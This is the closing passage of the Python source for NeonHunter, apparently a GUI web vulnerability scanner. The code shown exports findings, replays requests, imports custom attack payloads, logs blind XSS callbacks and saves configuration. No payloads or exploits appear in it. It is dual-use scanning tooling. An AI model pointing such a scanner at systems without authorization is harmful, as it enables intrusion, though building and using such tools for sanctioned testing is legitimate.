            <p>By Dickson Godwin Massawe</p>
            <p>GitHub: <a href="https://github.com/dkhacker707" style="color: var(--primary);">dkhacker707</a></p>
            <p>© {datetime.now().strftime('%Y')} NeonHunter | Hunt Ethically, Stay Secure</p>
        </div>
    </div>
</body>
</html>
"""
        return html

    def export_results_csv(self, filename):
        """Export results to CSV"""
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(['ID', 'Timestamp', 'Vulnerability', 'Severity', 'Parameter', 
                           'Payload', 'URL', 'Evidence', 'Status Code', 'PoC'])
            
            for vuln in self.results:
                writer.writerow([
                    vuln['id'],
                    vuln['timestamp'],
                    vuln['vuln_type'],
                    vuln['severity'],
                    vuln['param'],
                    vuln['payload'],
                    vuln['url'],
                    '; '.join(vuln['evidence']),
                    vuln['response_code'],
                    vuln.get('screenshot', '')
                ])
                
    def export_results_json(self, filename):
        """Export results to JSON"""
        report_data = {
            'target': self.target_entry.get(),
            'timestamp': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.results),
            'vulnerabilities': self.results,
            'stats': self.stats
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2)
            
    def export_statistics(self):
        """Export statistics to file"""
        if not self.results:
            messagebox.showwarning("No Data", "No scan data available")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            stats_text = f"""
NEONHUNTER STATISTICS REPORT
============================

Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target: {self.target_entry.get()}

📊 PERFORMANCE STATS:
• Total Requests: {self.stats['requests_sent']}
• Successful Requests: {self.stats['requests_success']}
• Errors: {self.stats['errors']}
• Scan Duration: {self.stats.get('scan_duration', 'N/A')}
• Payloads/Sec: {self.stats.get('payloads_per_second', 0):.1f}

🔍 VULNERABILITY STATS:
• Total Findings: {len(self.results)}
• Critical: {self.stats['critical_findings']}
• High: {self.stats['high_findings']}
• Medium: {self.stats['medium_findings']}
• Low: {self.stats['low_findings']}

📋 VULNERABILITY BREAKDOWN:
"""
            
            vuln_counts = {}
            for vuln in self.results:
                vuln_type = vuln['vuln_type']
                vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + 1
            
            for vuln_type, count in vuln_counts.items():
                stats_text += f"• {vuln_type}: {count}\n"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(stats_text)
            
            self.log(f"📈 Statistics exported to {filename}")
            
    def show_statistics(self):
        """Show statistics dialog"""
        if not self.results and self.stats['requests_sent'] == 0:
            messagebox.showinfo("Statistics", "No scan data available yet")
            return
        
        stats_text = f"""
📊 NEONHUNTER STATISTICS
========================

🎯 Target: {self.target_entry.get() or 'Not set'}

⚡ PERFORMANCE:
• Total Requests: {self.stats['requests_sent']}
• Successful: {self.stats['requests_success']}
• Errors: {self.stats['errors']}
• Scan Duration: {self.stats.get('scan_duration', 'N/A')}
• Speed: {self.stats.get('payloads_per_second', 0):.1f}/s

🔍 FINDINGS:
• Total Vulnerabilities: {len(self.results)}
• Critical: {self.stats['critical_findings']}
• High: {self.stats['high_findings']}
• Medium: {self.stats['medium_findings']}
• Low: {self.stats['low_findings']}

📈 SUCCESS RATE: 
"""
        
        if self.stats['requests_sent'] > 0:
            success_rate = ((self.stats['requests_sent'] - self.stats['errors']) / 
                           self.stats['requests_sent'] * 100)
            stats_text += f"• {success_rate:.1f}% successful requests\n"
        
        messagebox.showinfo("Statistics", stats_text)
        
    def replay_request(self):
        """Replay the last request"""
        if not self.results:
            messagebox.showwarning("No Requests", "No requests to replay")
            return
        
        # Get the last request URL
        last_vuln = self.results[-1]
        url = last_vuln['url']
        
        try:
            session = self.get_session()
            response = session.get(url, timeout=10)
            
            # Show response in new window
            window = tk.Toplevel(self.root)
            window.title(f"Replay: {url[:50]}...")
            window.geometry("800x600")
            
            text = scrolledtext.ScrolledText(window, wrap='word')
            text.pack(fill='both', expand=True)
            
            text.insert('1.0', f"URL: {url}\n")
            text.insert('2.0', f"Status: {response.status_code}\n")
            text.insert('3.0', f"Headers:\n{response.headers}\n")
            text.insert('4.0', f"\nResponse Body:\n{response.text[:5000]}")
            
            self.log(f"↩️ Replayed request to {url[:50]}...")
        except Exception as e:
            messagebox.showerror("Replay Error", f"Failed to replay request:\n{e}")
            
    def manage_sessions(self):
        """Manage HTTP sessions"""
        messagebox.showinfo("Session Manager", 
                          "Session management feature will be implemented in future version.")
        
    def customize_payloads(self):
        """Customize payloads"""
        window = tk.Toplevel(self.root)
        window.title("Custom Payloads Editor")
        window.geometry("600x400")
        
        text = scrolledtext.ScrolledText(window, wrap='word')
        text.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Load existing custom payloads
        if self.custom_payloads:
            for vuln_type, payloads in self.custom_payloads.items():
                text.insert('end', f"# {vuln_type}\n")
                for payload in payloads:
                    text.insert('end', f"{payload}\n")
                text.insert('end', "\n")
        
        def save_payloads():
            content = text.get('1.0', tk.END)
            # Parse and save custom payloads
            self.log("💾 Custom payloads saved")
            window.destroy()
        
        tk.Button(window, text="Save", command=save_payloads).pack(pady=10)
        
    def import_custom_payloads(self):
        """Import custom payloads from file"""
        filepath = filedialog.askopenfilename(
            title="Import Payloads",
            filetypes=[("Text files", "*.txt"), ("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filepath:
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Parse payloads - support both JSON and text formats
                if filepath.endswith('.json'):
                    try:
                        payloads_dict = json.loads(content)
                        for vuln_type, payloads in payloads_dict.items():
                            if vuln_type in self.payloads:
                                self.payloads[vuln_type].extend(payloads)
                                self.log(f"📥 Added {len(payloads)} payloads to {vuln_type}")
                    except json.JSONDecodeError:
                        # Fallback to text parsing
                        lines = content.strip().split('\n')
                else:
                    # Text file parsing
                    lines = content.strip().split('\n')
                    vuln_type = "CUSTOM"
                    custom_payloads = []
                    
                    for line in lines:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if line.startswith('[') and line.endswith(']'):
                                # Category line like [XSS]
                                if custom_payloads and vuln_type:
                                    self.payloads[vuln_type] = self.payloads.get(vuln_type, []) + custom_payloads
                                    self.log(f"📥 Added {len(custom_payloads)} custom payloads to {vuln_type}")
                                vuln_type = line[1:-1].strip()
                                custom_payloads = []
                            else:
                                custom_payloads.append(line)
                    
                    # Add last batch
                    if custom_payloads and vuln_type:
                        self.payloads[vuln_type] = self.payloads.get(vuln_type, []) + custom_payloads
                        self.log(f"📥 Added {len(custom_payloads)} custom payloads to {vuln_type}")
                
                messagebox.showinfo("Import Successful", 
                                  f"Custom payloads imported successfully!\n\nFile: {os.path.basename(filepath)}")
                
            except Exception as e:
                messagebox.showerror("Import Error", f"Failed to import payloads:\n{e}")
                self.log(f"❌ Payload import failed: {e}")
                
    def play_alert_sound(self):
        """Play alert sound for critical findings"""
        try:
            for i in range(3):
                winsound.Beep(1000, 200)
                time.sleep(0.1)
        except:
            pass
            
    def load_config(self):
        """Load configuration"""
        config_file = "neonhunter_config.json"
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                
                if 'target' in config:
                    self.target_entry.delete(0, tk.END)
                    self.target_entry.insert(0, config['target'])
                
                if 'proxy' in config:
                    self.proxy_entry.delete(0, tk.END)
                    self.proxy_entry.insert(0, config['proxy'])
                
                if 'delay' in config:
                    self.delay_var.set(config['delay'])
                
                if 'concurrent' in config:
                    self.concurrent_requests.set(config['concurrent'])
                
                if 'timeout' in config:
                    self.timeout_var.set(config['timeout'])
                
                if 'vulns' in config:
                    for vuln, enabled in config['vulns'].items():
                        if vuln in self.vulns:
                            self.vulns[vuln].set(enabled)
                
                self.log("📥 Configuration loaded")
            except Exception as e:
                self.log(f"❌ Config load error: {e}")
                
    def save_config(self):
        """Save configuration"""
        config = {
            'target': self.target_entry.get(),
            'proxy': self.proxy_entry.get(),
            'delay': self.delay_var.get(),
            'concurrent': self.concurrent_requests.get(),
            'timeout': self.timeout_var.get(),
            'vulns': {name: var.get() for name, var in self.vulns.items()},
            'payloads': {name: payloads[:10] for name, payloads in self.payloads.items()}
        }
        
        with open("neonhunter_config.json", 'w') as f:
            json.dump(config, f, indent=2)
        
        self.log("💾 Configuration saved")
        
    def auto_save_worker(self):
        """Auto-save worker thread"""
        while True:
            time.sleep(60)  # Auto-save every minute
            if self.is_running and self.auto_save_var.get():
                self.save_auto_backup()
                
    def save_auto_backup(self):
        """Save auto-backup"""
        try:
            backup_dir = "backups"
            os.makedirs(backup_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"{backup_dir}/neonhunter_backup_{timestamp}.json"
            
            backup_data = {
                'timestamp': timestamp,
                'target': self.target_entry.get(),
                'results': self.results,
                'stats': self.stats
            }
            
            with open(backup_file, 'w') as f:
                json.dump(backup_data, f, indent=2)
            
            # Keep only last 10 backups
            backups = sorted([f for f in os.listdir(backup_dir) if f.startswith('neonhunter_backup_')])
            if len(backups) > 10:
                for old_backup in backups[:-10]:
                    os.remove(os.path.join(backup_dir, old_backup))
            
            self.log(f"💾 Auto-backup saved: {backup_file}")
        except Exception as e:
            self.log(f"❌ Auto-backup failed: {e}")
            
    def save_blind_xss_log(self, log_data):
        """Save blind XSS log"""
        try:
            log_dir = "blind_xss_logs"
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = f"{log_dir}/blind_xss_{datetime.now().strftime('%Y%m%d')}.json"
            
            logs = []
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    logs = json.load(f)
            
            logs.append(log_data)
            
            with open(log_file, 'w') as f:
                json.dump(logs, f, indent=2)
            
        except Exception as e:
            self.log(f"❌ Failed to save blind XSS log: {e}")
            
    def zoom_text(self, factor):
        """Zoom text in/out"""
        current_font = self.log_text['font']
        font_parts = current_font.split()
        if len(font_parts) >= 2:
            try:
                size = int(font_parts[1])
                new_size = max(8, min(24, int(size * factor)))
                self.log_text.config(font=(font_parts[0], new_size))
                self.log(f"🔍 Text zoom: {new_size}pt")
            except:
                pass
                
    def on_closing(self):
        """Handle application closing"""
        if messagebox.askyesno("Exit", "Are you sure you want to exit NeonHunter?"):
            self.save_config()
            
            if hasattr(self, 'blind_server') and self.blind_server:
                self.blind_server.shutdown()
            
            self.root.destroy()
            
    def clear_monitors(self):
        self.play_click_sound()
        if hasattr(self, 'live_monitor') and self.live_monitor:
            self.live_monitor.clear_logs()
        self.log("🧹 Monitors cleared")
if __name__ == "__main__":
    root = tk.Tk()
    try:
        app = AdvancedNeonHunter(root)
        root.protocol("WM_DELETE_WINDOW", app.on_closing)
        root.mainloop()
    except Exception as e:
        print(f"❌ Error starting application: {e}")
        import traceback
        traceback.print_exc()